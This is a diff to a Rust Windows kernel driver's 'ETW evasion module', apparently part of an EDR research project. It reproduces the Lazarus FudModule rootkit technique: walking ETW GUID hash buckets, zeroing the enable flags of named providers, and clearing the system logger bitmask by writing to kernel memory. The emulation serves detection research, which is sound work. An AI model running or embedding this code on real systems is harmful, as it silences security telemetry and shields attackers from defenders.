@@ -1,9 +1,14 @@
 //! ETW evasion module.
 //! Source ref of combating techniques, see my EDR: https://github.com/0xflux/ferric-fox/
 
-use core::ffi::c_void;
+use core::{ffi::c_void, ptr::null};
 
-use alloc::{collections::btree_map::BTreeMap, format, string::String, vec::Vec};
+use alloc::{
+    collections::btree_map::BTreeMap,
+    format,
+    string::{String, ToString},
+    vec::Vec,
+};
 use wdk::println;
 use wdk_sys::{
     UNICODE_STRING,
@@ -199,10 +204,9 @@ pub fn get_etw_dispatch_table<'a>() -> Result<BTreeMap<&'a str, *const c_void>, 
     Ok(dispatch_table)
 }
 
-
 /// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_REG_ENTRY
 #[repr(C)]
-#[derive(Copy, Clone, Debug)]
+#[derive(Copy, Clone, Debug, Eq, PartialEq)]
 struct EtwRegEntry {
     unused_0: ListEntry,
     unused_1: ListEntry,
@@ -212,9 +216,9 @@ struct EtwRegEntry {
 
 /// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_GUID_ENTRY
 #[repr(C)]
-#[derive(Copy, Clone, Debug)]
+#[derive(Copy, Clone, Debug, Eq, PartialEq)]
 struct GuidEntry {
-    unused_0: ListEntry,
+    guid_list: ListEntry,
     unused_1: ListEntry,
     unused_2: i64,
     guid: GUID,
@@ -223,13 +227,13 @@ struct GuidEntry {
 }
 
 #[repr(C)]
-#[derive(Debug, Copy, Clone)]
+#[derive(Debug, Copy, Clone, Eq, PartialEq)]
 struct TraceEnableInfo {
     is_enabled: u32,
 }
 
 #[repr(C)]
-#[derive(Debug, Copy, Clone)]
+#[derive(Debug, Copy, Clone, Eq, PartialEq)]
 pub struct GUID {
     data_1: u32,
     data_2: u16,
@@ -258,10 +262,16 @@ impl GUID {
 }
 
 #[repr(C)]
-#[derive(Copy, Clone, Debug)]
+#[derive(Copy, Clone, Debug, Eq, PartialEq)]
 struct ListEntry {
     flink: *const c_void,
     blink: *const c_void,
+}
+
+#[derive(Debug)]
+enum EtwMonitorError {
+    NullPtr,
+    SymbolNotFound,
 }
 
 /// Monitor the system logger bitmask as observed to be exploited by Lazarus in their FudModule rootkit.
@@ -278,16 +288,16 @@ pub fn clear_system_logger_bitmask() {
     }
 
     // SAFETY: Null pointer checked above
-    if unsafe {*address}.is_null() {
+    if unsafe { *address }.is_null() {
         println!("[ferric-fox] [-] Address for EtwSiloDriverState is null");
         return;
-    } 
-    
+    }
+
     // Calculate the offset in memory to the bitmask so we can disable it.
     let address_of_silo_driver_state_struct = unsafe { *address } as usize;
     let logger_addr = address_of_silo_driver_state_struct + 0x1098;
     let addr = logger_addr as *mut u32;
-    
+
     // SAFETY: Pointer is valid based off of calculations
     unsafe { core::ptr::write(addr, 0) };
 
@@ -314,39 +324,73 @@ pub fn disable_single_guid() -> Result<(), ()> {
 
     // SAFETY: Null pointer checked above
     let first_hash_address = &(unsafe { &**address }.guid_hash_table);
-    
+
     for i in 0..64 {
-        let hash_bucket_entry = unsafe { first_hash_address.as_ptr().offset(i) } as *const *mut GuidEntry;
+        let hash_bucket_entry =
+            unsafe { first_hash_address.as_ptr().offset(i) } as *const *mut GuidEntry;
         if hash_bucket_entry.is_null() {
             println!("[ferric-fox] [i] Found null pointer whilst traversing list at index: {i}");
             continue;
         }
 
-        if unsafe {*hash_bucket_entry}.is_null() {
-            println!("[ferric-fox] [i] Found null INNER pointer whilst traversing list at index: {i}");
+        if unsafe { *hash_bucket_entry }.is_null() {
+            println!(
+                "[ferric-fox] [i] Found null INNER pointer whilst traversing list at index: {i}"
+            );
             continue;
         }
 
+        // Add the current outer entry to the map
         let guid_entry = unsafe { &mut **hash_bucket_entry };
 
-        if guid_entry.provider_enable_info.is_enabled != 0
-            && guid_entry.guid.to_string() == "EFB251E4-D454-4A02-B126-7FBB9D3991C3"
-        {
-            println!(
-                "Altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}",
-                guid_entry.provider_enable_info.is_enabled,
-                guid_entry.guid.to_string()
-            );
-
-            unsafe {
-                core::ptr::write(&mut guid_entry.provider_enable_info.is_enabled as *const u32 as *mut u32, 0u32);
+        // Look for other GUID entries under this bucket by traversing the linked list until we get back to
+        // the beginning
+        let first_guid_entry = guid_entry.guid_list.flink as *const GuidEntry;
+        let mut current_guid_entry: *const GuidEntry = null();
+        while first_guid_entry != current_guid_entry {
+            // Assign the first guid to the current in the event its the first iteration, aka the current is
+            // null from the above initialisation.
+            if current_guid_entry.is_null() {
+                current_guid_entry = first_guid_entry;
             }
 
-            println!(
-                "Finished altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}",
-                guid_entry.provider_enable_info.is_enabled,
-                guid_entry.guid.to_string()
-            );
+            if current_guid_entry.is_null() {
+                println!("[ferric-fox] [-] Current GUID entry is null, which is unexpected.");
+                break;
+            }
+
+            // Search for a GUID to use as a use case, one of the ones that lazarus did silence in their rootkit
+            // we will choose 555908d1-a6d7-4695-8e1e-26931d2012f4
+            // IOC source: https://github.com/avast/ioc/blob/master/FudModule/README.md
+            if unsafe { *current_guid_entry }.provider_enable_info.is_enabled != 0
+                && unsafe { *current_guid_entry }.guid.to_string().to_ascii_lowercase()
+                    == "555908d1-a6d7-4695-8e1e-26931d2012f4".to_string()
+            || unsafe { *current_guid_entry }.provider_enable_info.is_enabled != 0
+                && unsafe { *current_guid_entry }.guid.to_string().to_ascii_lowercase()
+                    == "EFB251E4-D454-4A02-B126-7FBB9D3991C3".to_string().to_ascii_lowercase()
+            {
+                println!(
+                    "Altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}",
+                    unsafe { *current_guid_entry }.provider_enable_info.is_enabled,
+                    unsafe { *current_guid_entry }.guid.to_string()
+                );
+
+                unsafe {
+                    (*(current_guid_entry as *mut GuidEntry)).provider_enable_info.is_enabled = 0u32;
+                }
+                
+                println!(
+                    "Finished altering Lazarus abused GUID entry with non-zero value: {:08b}, GUID: {}. Address of GUID {:p}",
+                    unsafe { *current_guid_entry }.provider_enable_info.is_enabled,
+                    unsafe { *current_guid_entry }.guid.to_string(),
+                    current_guid_entry,
+                );
+            }
+
+            // Walk to the next GUID item
+            // SAFETY: Null pointer dereference checked at the top of while loop
+            current_guid_entry =
+                unsafe { (*current_guid_entry).guid_list.flink as *const GuidEntry };
         }
     }
 
